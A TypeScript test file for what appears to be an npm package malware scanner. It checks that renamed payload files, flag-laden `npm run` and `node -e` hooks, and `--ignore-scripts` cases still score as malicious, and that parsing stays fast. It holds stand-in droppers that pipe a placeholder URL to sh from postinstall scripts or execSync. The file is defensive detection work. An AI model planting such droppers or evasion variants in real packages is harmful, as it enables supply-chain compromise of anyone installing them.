// Ways a package with a clearly malicious pattern scored higher than the same pattern written another way: a payload
// named like a document, an `npm run` with flags or quotes, an inline eval after other flags. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, expandHooks, finalize, gypCommands, isInlineDownload, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(manifest: AnalyzeInput["manifest"], files: Record<string, string>) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const all = [entry("package.json", JSON.stringify(m)), ...Object.entries(files).map(([p, t]) => entry(p, t))];
  const a: Analysis = analyze({ name: "probe-pkg", manifest: m, files: all, publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const DROPPER = "curl -s https://example.invalid/x.sh | sh";
const EXEC = (cmd: string): string => `require('child_process').execSync(${JSON.stringify(cmd)});\n`;

describe("a payload named like a document is still code", () => {
  for (const name of ["readme.js", "security.js", "history.js", "notice.js", "license.js", "lib/changes.js", "History.min.js", "notice.cjs"]) {
    test(`${name} holding a dropper is read, though nothing resolvable loads it`, () => {
      const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", [name]: EXEC(DROPPER) });

      expect(r.ids).toContain("remote-shell");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("a README.md with the same text is still not read", () => {
    const r = scoreOf({ main: "index.js" }, { "index.js": "module.exports = 1;\n", "README.md": `Install: \`${DROPPER}\`\n` });

    expect(r.ids).not.toContain("remote-shell");
  });
});

describe("an install script's `npm run` is followed whatever flags or quotes it has", () => {
  const variants = ["npm run -s payload", "npm run --silent payload", "npm --silent run payload", "npm run 'payload'", 'npm run "payload"', "yarn run -s payload", "pnpm --silent run payload", "bun run --silent payload"];

  test("npm run payload is the baseline: refused", () => {
    expect(scoreOf({ scripts: { postinstall: "npm run payload", payload: DROPPER } }, {}).ids).toContain("install-download");
  });

  for (const cmd of variants) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ scripts: { postinstall: cmd, payload: DROPPER } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }
});

describe("node's inline-eval flag is recognised after other flags", () => {
  const code = "\"require('https').get('https://example.invalid/x')\"";
  const plain = scoreOf({ scripts: { postinstall: `node -e ${code}` } }, {});

  for (const cmd of [`node --no-warnings -e ${code}`, `node -pe ${code}`, `node --input-type=module -e ${code}`, `nodejs -e ${code}`, `echo --result=$(node -e ${code})`, `echo "$(node --no-warnings -e ${code})"`, `echo $(node -e ${code})`, `x=$( node -e ${code} )`, `echo \`node -e ${code}\``, `echo --result=\`node -e ${code}\``]) {
    test(cmd.slice(0, 40), () => {
      const r = scoreOf({ scripts: { postinstall: cmd } }, {});

      expect(r.ids).toContain("install-download");
      expect(r.score).toBe(plain.score);
    });
  }
});

describe("npm run --ignore-scripts runs the script but not its pre and post scripts", () => {
  // npm docs, config `ignore-scripts`: `npm run`, `npm test` and the like still run their script, "but they will not run
  // any pre- or post-scripts", so a dropper in those never runs; npm 9 run locally printed only the named script's output
  const files = { "index.js": "module.exports = 1;\n" };
  const withHooks = (postinstall: string, name: string) => ({ scripts: { postinstall, [name]: "node index.js", [`pre${name}`]: DROPPER, [`post${name}`]: DROPPER } });
  const clean = scoreOf({ scripts: { postinstall: "npm run payload", payload: "node index.js" } }, files);

  for (const cmd of ["npm run --ignore-scripts payload", "npm --ignore-scripts run payload", "npm run --ignore-scripts=true payload", "npm run-script --ignore-scripts 'payload'", "npm --ignore-scripts test"]) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf(withHooks(cmd, cmd.endsWith("test") ? "test" : "payload"), files);

      expect(r.ids).not.toContain("install-download");
      expect(r.score).toBe(clean.score);
    });
  }

  // npm runs them here: no flag, the flag cleared by a later one or by `=false`, or a value npm refuses (then nothing runs)
  for (const cmd of ["npm run payload", "npm run --ignore-scripts=false payload", "npm run --ignore-scripts --no-ignore-scripts payload", "npm run --ignore-scripts=1 payload", "yarn run --ignore-scripts payload"]) {
    test(`postinstall: ${cmd} still reads them`, () => {
      const r = scoreOf(withHooks(cmd, "payload"), files);

      expect(r.ids).toContain("install-download");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("the same script run again without the flag still reads them", () => {
    const r = scoreOf(withHooks("npm run --ignore-scripts payload && npm run payload", "payload"), files);

    expect(r.ids).toContain("install-download");
  });
});

describe("the flags a command may carry are read in linear time", () => {
  // each flag has one reading (`--a` is never `-` then `-a`), or a run of them that never matches backtracks exponentially;
  // and a flag value that names an interpreter (`--conditions=node`) must not start a fresh scan of the flags after it
  for (const cmd of [`node ${"--a ".repeat(40)}x`, `npm ${"--a=b ".repeat(40)}x`, `yarn ${"--a ".repeat(40)}`, `node ${"--conditions=node ".repeat(16000)}x`, `npm ${"--c=npm ".repeat(16000)}x`, `echo ${"a ".repeat(4_000_000)}`, `node ${"--a ".repeat(1_000_000)}x`]) {
    test(`${cmd.slice(0, 24)} (${cmd.length} chars)`, () => {
      const started = performance.now();

      expandHooks({ scripts: { postinstall: cmd } });
      expect(performance.now() - started).toBeLessThan(500);
    });
  }

  // the review's input, 288 KB of `--conditions=node` that made the old regex take about 5 s, and twice that: the inline
  // eval check alone, then the whole scorer
  for (const n of [16_000, 32_000]) {
    const cmd = `node ${"--conditions=node ".repeat(n)}x`;

    test(`isInlineDownload on ${cmd.length} chars of flags`, () => {
      const started = performance.now();

      expect(isInlineDownload(cmd)).toBe(false);
      expect(performance.now() - started).toBeLessThan(100);
    });
  }

  test("the scorer on 288 KB of flags", () => {
    const started = performance.now();

    scoreOf({ scripts: { postinstall: `node ${"--conditions=node ".repeat(16_000)}x` } }, {});
    expect(performance.now() - started).toBeLessThan(1_000);
  });

  test("a 4 MiB binding.gyp command is read without a list of its words", () => {
    const [cmd = ""] = gypCommands(`{ 'targets': [{ 'sources': ['<!(echo ${"a ".repeat(2 * 1024 * 1024)})'] }] }`);
    const started = performance.now();

    expect(isInlineDownload(cmd)).toBe(false);
    expect(performance.now() - started).toBeLessThan(100);
  });
});
